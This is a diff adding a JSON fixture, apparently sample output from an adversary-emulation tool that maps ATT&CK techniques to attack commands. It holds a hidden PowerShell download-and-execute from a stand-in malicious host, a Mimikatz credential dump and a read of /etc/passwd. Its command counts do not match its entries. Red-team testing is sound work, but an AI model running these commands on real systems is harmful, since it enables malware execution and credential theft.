@@ -1,0 +1,65 @@
+{
+    "status": "success",
+    "agent_id": "dummy-agent-id",
+    "timestamp": "2025-12-05T12:00:00.000000",
+    "generation_summary": {
+        "ttps_processed": 2,
+        "commands_generated": 4,
+        "langchain_generations": 4,
+        "processing_time_ms": 1200
+    },
+    "attack_commands": [
+        {
+            "id": "cmd-1",
+            "ttp_id": "ttp-1",
+            "technique_id": "T1059.001",
+            "technique_name": "PowerShell",
+            "tactic": "Execution",
+            "platform": "windows",
+            "command": "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://malicious.site/payload.ps1'))\"",
+            "description": "Download and execute payload via PowerShell",
+            "requires_admin": false,
+            "safety_level": "medium",
+            "expected_behavior": "Network connection to malicious site, process creation",
+            "source": "langchain",
+            "generated_at": "2025-12-05T12:00:00.000000",
+            "confidence_score": 0.9,
+            "validated": true
+        },
+        {
+            "id": "cmd-2",
+            "ttp_id": "ttp-2",
+            "technique_id": "T1003",
+            "technique_name": "OS Credential Dumping",
+            "tactic": "Credential Access",
+            "platform": "windows",
+            "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+            "description": "Dump credentials using Mimikatz",
+            "requires_admin": true,
+            "safety_level": "high",
+            "expected_behavior": "LSASS access, credential dump",
+            "source": "langchain",
+            "generated_at": "2025-12-05T12:00:05.000000",
+            "confidence_score": 0.85,
+            "validated": true
+        },
+        {
+            "id": "cmd-3",
+            "ttp_id": "ttp-3",
+            "technique_id": "T1087.001",
+            "technique_name": "Account Discovery: Local Account",
+            "tactic": "Discovery",
+            "platform": "linux",
+            "command": "cat /etc/passwd",
+            "description": "List local accounts on Linux",
+            "requires_admin": false,
+            "safety_level": "low",
+            "expected_behavior": "Read /etc/passwd file",
+            "source": "langchain",
+            "generated_at": "2025-12-05T12:00:10.000000",
+            "confidence_score": 0.95,
+            "validated": true
+        }
+    ],
+    "errors": []
+}
